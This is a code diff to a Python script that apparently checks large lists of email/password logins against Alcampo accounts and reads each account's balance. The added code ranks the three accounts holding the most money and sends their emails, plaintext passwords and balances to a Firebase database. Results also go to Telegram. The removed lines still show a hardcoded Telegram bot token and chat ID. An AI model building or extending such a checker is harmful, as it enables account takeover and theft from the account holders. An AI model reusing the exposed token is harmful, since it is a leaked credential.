@@ -138,8 +138,9 @@ def update_progress(thread_idx, email, status, saldo_str):
                     progress_state["money"] += 1
                 else:
                     progress_state["zero"] += 1
+            # If saldo_val is None but login was successful, count as zero (could not read balance page)
             else:
-                progress_state["error"] += 1
+                progress_state["zero"] += 1
         else:
             progress_state["error"] += 1
             
@@ -178,13 +179,18 @@ def update_progress(thread_idx, email, status, saldo_str):
                         prog_url = url.rstrip('/') + "/progress.json"
                         requests.put(prog_url, json=state_snap, timeout=5)
                         
-                        # Push latest logs (last 100 lines)
+                        # Push latest logs (last 100 lines), filtering Selenium stack traces
                         try:
                             log_path = ROOT / "consola.log"
                             if log_path.exists():
                                 with open(log_path, "r", encoding="utf-8") as f:
                                     lines = f.readlines()
-                                latest_logs = "".join(lines[-100:])
+                                # Filter out Selenium/Chrome stack trace lines (memory addresses)
+                                filtered = [l for l in lines if not (l.strip().startswith('#') and '0x' in l)
+                                            and 'Stacktrace:' not in l
+                                            and '(Session info:' not in l
+                                            and '<unknown>' not in l]
+                                latest_logs = "".join(filtered[-100:])
                                 logs_url = url.rstrip('/') + "/logs.json"
                                 requests.put(logs_url, json=latest_logs, timeout=5)
                         except Exception:
@@ -424,9 +430,9 @@ def limpiar_saldo(saldo_str):
 def main():
     args = parse_args()
     
-    # Telegram config fallback
-    telegram_token = os.environ.get("TELEGRAM_TOKEN", "8041531688:AAHif8qa9wMZ1EAxU3MrftR-tCrEkQ2dfPU")
-    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "-5049278431")
+    # Telegram config (from environment variables only)
+    telegram_token = os.environ.get("TELEGRAM_TOKEN", "")
+    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "")
     
     # Convert chat_id to int if it's a string representation of an int
     try:
@@ -488,10 +494,10 @@ def main():
     
     # Resumen
     saldo_total = 0.0
-    cuenta_top = {"email": "N/A", "saldo_val": 0.0}
     cuentas_con_saldo = 0
     cuentas_saldo_cero = 0
     cuentas_error = 0
+    cuentas_ranked = []  # List of (valor, email, password) for ranking
     
     for r in resultados:
         valor = limpiar_saldo(r.get("saldo"))
@@ -501,10 +507,18 @@ def main():
         saldo_total += valor
         if valor > 0:
             cuentas_con_saldo += 1
+            cuentas_ranked.append((valor, r["email"], r.get("password", "")))
         elif valor == 0:
             cuentas_saldo_cero += 1
-        if valor > cuenta_top["saldo_val"]:
-            cuenta_top = {"email": r["email"], "saldo_val": valor}
+
+    # Sort by balance descending and take top 3
+    cuentas_ranked.sort(key=lambda x: x[0], reverse=True)
+    top_3 = cuentas_ranked[:3]
+    
+    top_3_text = "\n".join(
+        f"   {i+1}. {email} ({val:.2f} €)"
+        for i, (val, email, _) in enumerate(top_3)
+    ) if top_3 else "   N/A"
             
     mensaje_resumen = (
         f"📊 **RESUMEN ALCAMPO OPTIMIZADO**\n\n"
@@ -514,10 +528,23 @@ def main():
         f"💎 Cuentas con dinero: {cuentas_con_saldo}\n"
         f"💤 Cuentas con saldo 0: {cuentas_saldo_cero}\n"
         f"⚠️ Cuentas con error/sin saldo: {cuentas_error}\n"
-        f"🏆 **Top Cuenta:** {cuenta_top['email']} ({cuenta_top['saldo_val']:.2f} €)"
+        f"🏆 **Top 3 Cuentas:**\n{top_3_text}"
     )
     
     print("\n" + mensaje_resumen)
+    
+    # Push top 3 accounts to Firebase for real-time dashboard display
+    firebase_url = os.environ.get("FIREBASE_DB_URL")
+    if firebase_url and top_3:
+        try:
+            top_accounts_data = [
+                {"email": email, "password": pwd, "balance": val}
+                for val, email, pwd in top_3
+            ]
+            url = firebase_url.strip().rstrip('/') + "/top_accounts.json"
+            requests.put(url, json=top_accounts_data, timeout=5)
+        except Exception:
+            pass
     
     if args.send_telegram:
         enviar_telegram_texto(telegram_token, chat_id, mensaje_resumen)
